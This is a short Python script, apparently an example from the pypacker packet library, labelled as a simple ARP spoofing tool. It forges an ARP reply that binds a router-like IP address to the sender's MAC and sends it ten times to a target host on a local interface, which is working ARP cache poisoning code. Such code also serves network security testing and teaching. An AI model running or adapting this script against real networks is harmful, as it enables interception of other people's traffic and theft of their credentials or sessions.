"""Simple ARP spoofing tool."""
from pypacker.layer12 import arp, ethernet

from pypacker import psocket
import time

# interface to listen on
IFACE	= "eth1"
# our real MAC
MAC_SRC	= "00:11:22:33:44:55"
# IP to be spoofed
IP_SRC	= "192.168.178.1"
# destination address
MAC_DST	= "00:11:22:33:44:56"
IP_DST	= "192.168.178.27"

#
# spoof ARP response
#
arp_spoof	= ethernet.Ethernet(dst_s=MAC_DST, src_s=MAC_SRC, type=ethernet.ETH_TYPE_ARP) +\
		arp.ARP(sha_s=MAC_SRC, spa_s=IP_SRC, tha_s=MAC_DST, tpa_s=IP_DST, op=arp.ARP_OP_REPLY)

psock	= psocket.SocketHndl(iface_name=IFACE, timeout=600)
for a in range(10):
	print("sending ARP response")
	psock.send(arp_spoof.bin())
	time.sleep(1)
psock.close()
